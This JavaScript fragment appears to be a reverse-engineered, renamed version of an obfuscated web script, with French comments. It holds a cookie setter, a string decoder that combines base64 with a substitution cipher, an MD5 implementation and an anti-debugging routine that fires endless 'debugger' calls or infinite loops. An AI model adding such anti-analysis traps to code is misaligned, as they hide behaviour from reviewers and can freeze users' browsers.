    }
    document.cookie = updatedCookie + '; path=/'
}
function decodeString(arg_encodedChars) {
    if (typeof arg_encodedChars == 'string' && arg_encodedChars.length > 3) {
        var originalChars =
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_=',
            encodedChars =
                'b2vjLriH_OalnkQ8DWEPyIpgmBYxJhoG1sNUR-cfdMFSVKzTw609uq4Ae3tZ=5X7C'
        arg_encodedChars = arg_encodedChars.substr(1)
        arg_encodedChars = atob(arg_encodedChars)
        if (typeof arg_encodedChars == 'string' && arg_encodedChars.length > 0) {
            var decodedString = ''
            for (var index in arg_encodedChars) {
                if (typeof arg_encodedChars[index] != 'function') {
                    var charIndex = encodedChars.indexOf(arg_encodedChars[index])
                    if (charIndex != -1) {
                        decodedString += originalChars.substr(charIndex, 1)
                    } else {
                        decodedString += arg_encodedChars[index]
                    }
                }
            }
            return decodedString
        } else {
            return false
        }
    } else {
        return false
    }
}

//Hachage MD5, réimplémentation du script suivant : 
//https://raw.githubusercontent.com/blueimp/JavaScript-MD5/master/js/md5.js
function md5Hash(input) {
    //function eb2919378f(eb2958a358, eb293ba817)
    function leftRotate(value, shiftBits) {
        return (value << shiftBits) | (value >>> (32 - shiftBits))
    }

    //function eb293c93c5(eb2957e31d, eb294916b0)    
    function addUnsigned(x, y) {
        var x4, y4, x8, y8, result;
        x8 = (x & 0x80000000);
        y8 = (y & 0x80000000);
        x4 = (x & 0x40000000);
        y4 = (y & 0x40000000);
        result = (x & 0x3FFFFFFF) + (y & 0x3FFFFFFF);
        if (x4 & y4) {
            return (result ^ 0x80000000 ^ x8 ^ y8);
        }
        if (x4 | y4) {
            if (result & 0x40000000) {
                return (result ^ 0xC0000000 ^ x8 ^ y8);
            } else {
                return (result ^ 0x40000000 ^ x8 ^ y8);
            }
        } else {
            return (result ^ x8 ^ y8);
        }
    }

    //function eb2924a2f3(eb29d4d17b, eb295dbb27, eb2934a343)
    function F(x, y, z) { return (x & y) | (~x & z); }

    //function eb29279078(eb293c9c4a, eb2946f4fc, eb292f8bd7)
    function G(x, y, z) { return (x & z) | (y & ~z); }

    //function eb294b34b1(eb293fa8a7, eb2912b8f0, eb29ddcebf)
    function H(x, y, z) { return x ^ y ^ z; }

    //function eb2930c84c(eb2920120a, eb2919dc9b, eb293ab28d)
    function I(x, y, z) { return y ^ (x | ~z); }

    //function eb2929f82a(eb29859754,eb293255ca,eb292f078c,eb294733e6,eb2914271a,eb291c46b3,eb29533a91)
    //function eb291f5820(eb29405795,eb29117f2d,eb2940a65c,eb29573ddf,eb294b93d3,eb2919fc11,eb2950844b)
    //function eb29332b0f(eb2924c1e8,eb292c23e1,eb29998d09,eb294a2bc4,eb292cb74f,eb298adea1,eb29452c6d)
    //function eb2917281d(eb293147fd,eb2949b912,eb29166ac9,eb292fc4c6,eb29979a01,eb293fb7a3,eb291c83b0)
    function transform(func, a, b, c, d, x, s, ac) {
        a = addUnsigned(a, addUnsigned(addUnsigned(func(b, c, d), x), ac));
        return addUnsigned(leftRotate(a, s), b);
    }

    //function eb29369e5a(eb293af8a7)
    function convertToWordArray(string) {
        var wordArray = [];
        var stringLength = string.length;
        var messageLength = stringLength + 8;
        var numberOfWords = ((messageLength - (messageLength % 64)) / 64 + 1) * 16;
        var bytePosition = 0;
        var byteCount = 0;

        while (byteCount < stringLength) {
            var wordCount = (byteCount - (byteCount % 4)) / 4;
            bytePosition = (byteCount % 4) * 8;
            wordArray[wordCount] = (wordArray[wordCount] | (string.charCodeAt(byteCount) << bytePosition));
            byteCount++;
        }

        var wordCount = (byteCount - (byteCount % 4)) / 4;
        bytePosition = (byteCount % 4) * 8;
        wordArray[wordCount] = wordArray[wordCount] | (0x80 << bytePosition);
        wordArray[numberOfWords - 2] = stringLength << 3;
        wordArray[numberOfWords - 1] = stringLength >>> 29;

        return wordArray;
    }

    //function eb294e241d(eb293325d9)
    function wordToHex(value) {
        var hexValue = "";
        for (var count = 0; count <= 3; count++) {
            var byte = (value >>> (count * 8)) & 255;
            var tempHex = "0" + byte.toString(16);
            hexValue += tempHex.substr(tempHex.length - 2, 2);
        }
        return hexValue;
    }

    //function eb2921c22d(eb29264a3a)
    function utf8Encode(string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";

        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if (c > 127 && c < 2048) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }
        }
        return utftext;
    }


    var x = [];
    var k, AA, BB, CC, DD, a, b, c, d;
    var S11 = 7, S12 = 12, S13 = 17, S14 = 22;
    var S21 = 5, S22 = 9, S23 = 14, S24 = 20;
    var S31 = 4, S32 = 11, S33 = 16, S34 = 23;
    var S41 = 6, S42 = 10, S43 = 15, S44 = 21;

    input = utf8Encode(input);
    x = convertToWordArray(input);

    a = 0x67452301;
    b = 0xEFCDAB89;
    c = 0x98BADCFE;
    d = 0x10325476;

    for (k = 0; k < x.length; k += 16) {
        AA = a;
        BB = b;
        CC = c;
        DD = d;
        a = transform(F, a, b, c, d, x[k + 0], S11, 0xD76AA478);
        d = transform(F, d, a, b, c, x[k + 1], S12, 0xE8C7B756);
        c = transform(F, c, d, a, b, x[k + 2], S13, 0x242070DB);
        b = transform(F, b, c, d, a, x[k + 3], S14, 0xC1BDCEEE);
        a = transform(F, a, b, c, d, x[k + 4], S11, 0xF57C0FAF);
        d = transform(F, d, a, b, c, x[k + 5], S12, 0x4787C62A);
        c = transform(F, c, d, a, b, x[k + 6], S13, 0xA8304613);
        b = transform(F, b, c, d, a, x[k + 7], S14, 0xFD469501);
        a = transform(F, a, b, c, d, x[k + 8], S11, 0x698098D8);
        d = transform(F, d, a, b, c, x[k + 9], S12, 0x8B44F7AF);
        c = transform(F, c, d, a, b, x[k + 10], S13, 0xFFFF5BB1);
        b = transform(F, b, c, d, a, x[k + 11], S14, 0x895CD7BE);
        a = transform(F, a, b, c, d, x[k + 12], S11, 0x6B901122);
        d = transform(F, d, a, b, c, x[k + 13], S12, 0xFD987193);
        c = transform(F, c, d, a, b, x[k + 14], S13, 0xA679438E);
        b = transform(F, b, c, d, a, x[k + 15], S14, 0x49B40821);

        a = transform(G, a, b, c, d, x[k + 1], S21, 0xF61E2562);
        d = transform(G, d, a, b, c, x[k + 6], S22, 0xC040B340);
        c = transform(G, c, d, a, b, x[k + 11], S23, 0x265E5A51);
        b = transform(G, b, c, d, a, x[k + 0], S24, 0xE9B6C7AA);
        a = transform(G, a, b, c, d, x[k + 5], S21, 0xD62F105D);
        d = transform(G, d, a, b, c, x[k + 10], S22, 0x02441453);
        c = transform(G, c, d, a, b, x[k + 15], S23, 0xD8A1E681);
        b = transform(G, b, c, d, a, x[k + 4], S24, 0xE7D3FBC8);
        a = transform(G, a, b, c, d, x[k + 9], S21, 0x21E1CDE6);
        d = transform(G, d, a, b, c, x[k + 14], S22, 0xC33707D6);
        c = transform(G, c, d, a, b, x[k + 3], S23, 0xF4D50D87);
        b = transform(G, b, c, d, a, x[k + 8], S24, 0x455A14ED);
        a = transform(G, a, b, c, d, x[k + 13], S21, 0xA9E3E905);
        d = transform(G, d, a, b, c, x[k + 2], S22, 0xFCEFA3F8);
        c = transform(G, c, d, a, b, x[k + 7], S23, 0x676F02D9);
        b = transform(G, b, c, d, a, x[k + 12], S24, 0x8D2A4C8A);

        a = transform(H, a, b, c, d, x[k + 5], S31, 0xFFFA3942);
        d = transform(H, d, a, b, c, x[k + 8], S32, 0x8771F681);
        c = transform(H, c, d, a, b, x[k + 11], S33, 0x6D9D6122);
        b = transform(H, b, c, d, a, x[k + 14], S34, 0xFDE5380C);
        a = transform(H, a, b, c, d, x[k + 1], S31, 0xA4BEEA44);
        d = transform(H, d, a, b, c, x[k + 4], S32, 0x4BDECFA9);
        c = transform(H, c, d, a, b, x[k + 7], S33, 0xF6BB4B60);
        b = transform(H, b, c, d, a, x[k + 10], S34, 0xBEBFBC70);
        a = transform(H, a, b, c, d, x[k + 13], S31, 0x289B7EC6);
        d = transform(H, d, a, b, c, x[k + 0], S32, 0xEAA127FA);
        c = transform(H, c, d, a, b, x[k + 3], S33, 0xD4EF3085);
        b = transform(H, b, c, d, a, x[k + 6], S34, 0x04881D05);
        a = transform(H, a, b, c, d, x[k + 9], S31, 0xD9D4D039);
        d = transform(H, d, a, b, c, x[k + 12], S32, 0xE6DB99E5);
        c = transform(H, c, d, a, b, x[k + 15], S33, 0x1FA27CF8);
        b = transform(H, b, c, d, a, x[k + 2], S34, 0xC4AC5665);

        a = transform(I, a, b, c, d, x[k + 0], S41, 0xF4292244);
        d = transform(I, d, a, b, c, x[k + 7], S42, 0x432AFF97);
        c = transform(I, c, d, a, b, x[k + 14], S43, 0xAB9423A7);
        b = transform(I, b, c, d, a, x[k + 5], S44, 0xFC93A039);
        a = transform(I, a, b, c, d, x[k + 12], S41, 0x655B59C3);
        d = transform(I, d, a, b, c, x[k + 3], S42, 0x8F0CCC92);
        c = transform(I, c, d, a, b, x[k + 10], S43, 0xFFEFF47D);
        b = transform(I, b, c, d, a, x[k + 1], S44, 0x85845DD1);
        a = transform(I, a, b, c, d, x[k + 8], S41, 0x6FA87E4F);
        d = transform(I, d, a, b, c, x[k + 15], S42, 0xFE2CE6E0);
        c = transform(I, c, d, a, b, x[k + 6], S43, 0xA3014314);
        b = transform(I, b, c, d, a, x[k + 13], S44, 0x4E0811A1);
        a = transform(I, a, b, c, d, x[k + 4], S41, 0xF7537E82);
        d = transform(I, d, a, b, c, x[k + 11], S42, 0xBD3AF235);
        c = transform(I, c, d, a, b, x[k + 2], S43, 0x2AD7D2BB);
        b = transform(I, b, c, d, a, x[k + 9], S44, 0xEB86D391);

        a = addUnsigned(a, AA);
        b = addUnsigned(b, BB);
        c = addUnsigned(c, CC);
        d = addUnsigned(d, DD);
    }

    var result = wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d);
    return result.toLowerCase();
}
function runtimeDebuggerPrevention(debuggerPreventionFlag) {
    function debuggerSecurityFunction(arg1) {
        if (typeof arg1 === 'string') {
            return function (de77414e9c) { }
                .constructor('while (true) {}')
                .apply('counter')
        } else {
            ; ('' + arg1 / arg1).length !== 1 || arg1 % 20 === 0
                ? function () {
                    return true
                }
                    .constructor('debugger')
                    .call('action')
                : function () {
                    return false
                }
                    .constructor('debugger')
                    .apply('stateObject')
        }
        debuggerSecurityFunction(++arg1)
    }
    try {
        if (debuggerPreventionFlag) {
            return debuggerSecurityFunction
        } else {
            debuggerSecurityFunction(0)
        }
    } catch (error) { }
}
